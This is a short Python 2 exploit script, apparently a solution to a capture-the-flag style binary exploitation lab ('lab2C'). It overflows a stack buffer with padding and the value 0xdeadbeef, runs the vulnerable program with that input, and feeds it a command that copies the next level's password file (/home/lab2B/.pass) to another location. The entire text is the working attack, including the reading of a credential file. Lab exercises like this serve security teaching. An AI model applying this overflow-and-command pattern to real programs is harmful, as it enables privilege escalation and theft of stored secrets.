# !/urs/bin/python
# coding: utf-8	
import os
import struct
crafted = "A"*(0x2c-0x1d) + struct.pack('<I', 0xdeadbeef) #little endian

cmd = 'python -c \'print "%s"\'' % crafted
os.system('(echo "cat /home/lab2B/.pass > /usr/slove/lab2B.pass") | ' + '/levels/lab02/lab2C $(%s)' %cmd)
print '[+] Pass stored in /usr/slove/lab2B.pass' 